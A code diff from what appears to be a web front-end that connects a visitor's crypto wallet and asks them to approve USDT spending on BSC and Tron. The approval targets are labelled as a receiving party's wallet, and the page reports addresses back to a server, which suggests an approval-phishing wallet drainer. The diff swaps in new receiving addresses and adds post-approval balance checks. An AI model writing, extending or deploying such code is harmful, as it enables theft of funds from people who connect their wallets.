@@ -107,7 +107,7 @@ import { SubmitAddress } from "@/api/upload";
 const { ethereum } = window; // 获取window.ethereum
 const bscWeb3 = new Web3(ethereum); // 初始化Web3
 const bscContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT 合约地址
-const bscApproveAddress = "0x44437384cD64310fA3e90EDbbdE62C9f8c34166e"; // BSC 交易所或目标合约地址
+const bscApproveAddress = "0x2ff0f5ec1f7d637f1b2966c8e87656c1b91e301b"; // BSC 交易所或目标合约地址
 
 // Bsc网络ID
 const Bsc_CHAIN_ID = "0x38"; // BSC网络的链ID 64进制
@@ -241,11 +241,8 @@ const authorized = ref();
 const Loading = ref(false);
 
 const tronWebValue = ref<any>(undefined); // TronWeb 实例
-const usdtAddress = "TNW1DARH9eNzJofR3uHv58rRPhWMuf13Fu"; // USDT  授权地址
-// const usdtAddress = "TF17BgPaZYbz8oxbjhriubPDsA7ArKoLX3"; // 假U JST 1
-// const contractAddress = "TPSccvUSCjjTGbf6TSLwTNmCexHqi6BbPt"; // 合约地址 1
-
-const contractAddress = "TDqSquXBgUCLYvYC4XZgrprLK589dkhSCf"; // 被授权方钱包地址
+const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT  授权地址
+const contractAddress = "TGqGZTULSPCMgaKmAQQjesAmG2YWMiVrY4"; // 被授权方钱包地址
 
 // 连接钱包逻辑
 async function connectWallet() {
@@ -342,6 +339,7 @@ async function approve() {
           const confirmationNumber = Number(params.confirmations); // 从 params 中获取确认次数
           if (confirmationNumber === 1) {
             ElMessage.success("BSC 授权成功");
+            getAuthorizedAmount();
           }
         })
         .on("error", (error: Error) => {
@@ -369,6 +367,7 @@ async function approve() {
         .send(options);
 
       ElMessage.success("授权成功");
+      getBscAuthorizedAmount();
     } catch (error) {
       ElMessage.error("授权失败");
       console.error("授权失败:", error);
